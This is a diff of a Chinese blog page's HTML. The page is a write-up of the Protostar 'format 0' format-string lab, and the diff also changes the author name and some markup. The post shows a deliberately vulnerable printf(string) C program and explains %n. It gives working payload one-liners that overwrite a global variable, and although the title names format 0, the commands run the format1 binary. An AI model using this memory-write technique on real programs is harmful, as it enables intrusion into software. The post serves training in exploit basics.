@@ -19,7 +19,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="0x00 序从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。
 0x01 format 0C语言代码
-1234567891011121314151617181920#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;st">
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+int target;
+
+voi">
 <meta name="keywords">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Protostar-栈溢出系列学习-format 0">
@@ -27,7 +34,14 @@
 <meta property="og:site_name" content="4ch12dy">
 <meta property="og:description" content="0x00 序从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。
 0x01 format 0C语言代码
-1234567891011121314151617181920#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;st">
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+int target;
+
+voi">
 <meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-1.png?raw=true">
 <meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-2.png?raw=true">
 <meta property="og:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-3.png?raw=true">
@@ -40,7 +54,14 @@
 <meta name="twitter:title" content="Protostar-栈溢出系列学习-format 0">
 <meta name="twitter:description" content="0x00 序从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。
 0x01 format 0C语言代码
-1234567891011121314151617181920#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;st">
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+int target;
+
+voi">
 <meta name="twitter:image" content="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-1.png?raw=true">
   
     <link rel="alternate" href="/atom.xml" title="4ch12dy" type="application/atom+xml">
@@ -48,8 +69,6 @@
   
     <link rel="icon" href="/favicon.png">
   
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
   
   <link rel="stylesheet" href="../../../../css/common.css">
 <link rel="stylesheet" href="../../../../css/nav.css">
@@ -64,7 +83,7 @@
     <nav class="nav">
          <div class="nav-left">
             <a href="/" class="nav-item" style="font-size: 20px;">
-              <span class="logo">Diskobólos</span>'s Blog
+              <span class="logo">xia0</span>'s Blog
             </a>
          </div>
         <div class="nav-center is-hidden position-relative" id="search_container">
@@ -88,7 +107,7 @@
                 My Works
             </a>
             
-            <a class="nav-item" href="../../../../about">
+            <a class="nav-item" href="../../../../aboutme">
                 About
             </a>
             
@@ -108,7 +127,7 @@
                 My Works
             </a>
             
-            <a class="nav-item flex-1" href="../../../../about">
+            <a class="nav-item flex-1" href="../../../../aboutme">
                 About
             </a>
             
@@ -163,7 +182,7 @@
             
             <div class="is-flex align-center">
                 <img class="post-avatar" src="https://cdn2.iconfinder.com/data/icons/rcons-user/32/male-shadow-circle-512.png">
-                <span style="padding:0 10px;"> <span class="sub-title">By</span> Diskobólos</span>
+                <span style="padding:0 10px;"> <span class="sub-title">By</span> xia0</span>
                 <span class="post-date sub-title">at: 2016-07-10</span>
             </div>
             
@@ -183,12 +202,48 @@
         <div class="content" style="overflow: auto">
             <h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>从现在开始我们先结束stack类型的漏洞，来学习一些format类型的漏洞，非常有趣。但也确实让我想了很久。</p>
 <h2 id="0x01-format-0"><a href="#0x01-format-0" class="headerlink" title="0x01 format 0"></a>0x01 format 0</h2><p>C语言代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">int target;</div><div class="line"></div><div class="line">void vuln(char *string)</div><div class="line">&#123;</div><div class="line">  printf(string);</div><div class="line">  </div><div class="line">  if(target) &#123;</div><div class="line">      printf(&quot;you have modified the target :)\n&quot;);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv)</div><div class="line">&#123;</div><div class="line">  vuln(argv[1]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h2 id="0x02-疑惑-amp-分析-amp-思考"><a href="#0x02-疑惑-amp-分析-amp-思考" class="headerlink" title="0x02 疑惑&amp;分析&amp;思考"></a>0x02 疑惑&amp;分析&amp;思考</h2><p>拿到这题，我和大家一样，哪里有可以利用的漏洞？？？就将一个命令行参数打印出来，很明显是让我们修改全局变量<strong>target</strong>的值。但好像除了<code>printf()</code>函数，就没有其他可疑的地方了。what fuck？ 一个<code>printf()</code>函数怎么会有漏洞？</p>
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int target;
+
+void vuln(char *string)
+{
+  printf(string);
+
+  if(target) {
+      printf(&quot;you have modified the target :)\n&quot;);
+  }
+}
+
+int main(int argc, char **argv)
+{
+  vuln(argv[1]);
+}
+</code></pre><h2 id="0x02-疑惑-amp-分析-amp-思考"><a href="#0x02-疑惑-amp-分析-amp-思考" class="headerlink" title="0x02 疑惑&amp;分析&amp;思考"></a>0x02 疑惑&amp;分析&amp;思考</h2><p>拿到这题，我和大家一样，哪里有可以利用的漏洞？？？就将一个命令行参数打印出来，很明显是让我们修改全局变量<strong>target</strong>的值。但好像除了<code>printf()</code>函数，就没有其他可疑的地方了。what fuck？ 一个<code>printf()</code>函数怎么会有漏洞？</p>
 <p>但仔细观察可以发现这次<code>printf</code>的用法有点奇怪，直接打印一个字符串地址，很少会这样用，会不会就是这里？？？</p>
 <h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p>其他不说，先运行下程序试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-1.png?raw=true" alt="0-1"><br>再试着输入格式字符试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-2.png?raw=true" alt="0-2"><br>很奇怪，我们貌似得到一些栈中的值，再多打印一些试试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-3.png?raw=true" alt="0-3"><br>可以看到后面打印出来了%x本身&lt;—<code>20782520</code>，通过linux stack layout可得知后面的确保存着参数字符串</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">local variables of main</div><div class="line">saved registers of main</div><div class="line">return address of main</div><div class="line">argc</div><div class="line">argv</div><div class="line">envp</div><div class="line">stack from startup code</div><div class="line">argc</div><div class="line">argv pointers</div><div class="line">NULL that ends argv[]</div><div class="line">environment pointers</div><div class="line">NULL that ends envp[]</div><div class="line">ELF Auxiliary Table</div><div class="line">argv strings              &lt;--------focus here</div><div class="line">environment strings</div><div class="line">program name</div><div class="line">NULL</div></pre></td></tr></table></figure>
-<h2 id="0x04-你不知道的printf"><a href="#0x04-你不知道的printf" class="headerlink" title="0x04 你不知道的printf"></a>0x04 你不知道的printf</h2><p>虽然我们可以通过上面的方法查看栈内容，即泄漏地址等。但如何才能改变target值呢？</p>
+<pre><code>...
+local variables of main
+saved registers of main
+return address of main
+argc
+argv
+envp
+stack from startup code
+argc
+argv pointers
+NULL that ends argv[]
+environment pointers
+NULL that ends envp[]
+ELF Auxiliary Table
+argv strings              &lt;--------focus here
+environment strings
+program name
+NULL
+</code></pre><h2 id="0x04-你不知道的printf"><a href="#0x04-你不知道的printf" class="headerlink" title="0x04 你不知道的printf"></a>0x04 你不知道的printf</h2><p>虽然我们可以通过上面的方法查看栈内容，即泄漏地址等。但如何才能改变target值呢？</p>
 <p>关注printf函数，有这么一段话：</p>
 <ul>
 <li>Code  such  as  printf(foo);  often indicates a bug, since foo may contain a % character.  If foo comes from untrusted user input, it may contain %n,causing the printf() call to write to memory and creating a security hole.</li>
@@ -199,10 +254,10 @@
 </ul>
 <p>看个例子<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-4.png?raw=true" alt="0-4"><br>这样的话就可以满足写入的问题了，现在的问题就是写入哪里，怎么写了</p>
 <h2 id="0x05-hack"><a href="#0x05-hack" class="headerlink" title="0x05 hack"></a>0x05 hack</h2><p>先利用<code>objdump -t</code>找到<code>target</code>的地址<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-5.png?raw=true" alt="0-5"><br>利用一句话Python反复测试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/opt/protostar/bin/format1  &quot;`python -c &apos;print &quot;A&quot;*4 + &quot;\x38\x96\x04\x08&quot; + &quot;BBB&quot;+&quot;%x &quot;*135&quot;&apos;`&quot;</div></pre></td></tr></table></figure>
-<p>调整%x的个数，使其target地址为最后一个<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-6.png?raw=true" alt="0-6"><br>然后将最后一个%x改为%n</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/opt/protostar/bin/format1  &quot;`python -c &apos;print &quot;A&quot;*4 + &quot;\x38\x96\x04\x08&quot; + &quot;BBB&quot;+&quot;%x &quot;*134+&quot;%n &quot;&apos;`&quot;</div></pre></td></tr></table></figure>
-<p>run!<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-7.png?raw=true" alt="0-7"><br><strong>成功修改target值!</strong></p>
+<pre><code>/opt/protostar/bin/format1  &quot;`python -c &#39;print &quot;A&quot;*4 + &quot;\x38\x96\x04\x08&quot; + &quot;BBB&quot;+&quot;%x &quot;*135&quot;&#39;`&quot;
+</code></pre><p>调整%x的个数，使其target地址为最后一个<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-6.png?raw=true" alt="0-6"><br>然后将最后一个%x改为%n</p>
+<pre><code>/opt/protostar/bin/format1  &quot;`python -c &#39;print &quot;A&quot;*4 + &quot;\x38\x96\x04\x08&quot; + &quot;BBB&quot;+&quot;%x &quot;*134+&quot;%n &quot;&#39;`&quot;
+</code></pre><p>run!<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-format%200/0-7.png?raw=true" alt="0-7"><br><strong>成功修改target值!</strong></p>
 <h2 id="0x06-一点感悟"><a href="#0x06-一点感悟" class="headerlink" title="0x06 一点感悟"></a>0x06 一点感悟</h2><p>总的来说，自己受到了一点震感。So amazing！没想到一个printf使用不当就可能造成这么严重的漏洞。继续学习吧！</p>
 
         </div>
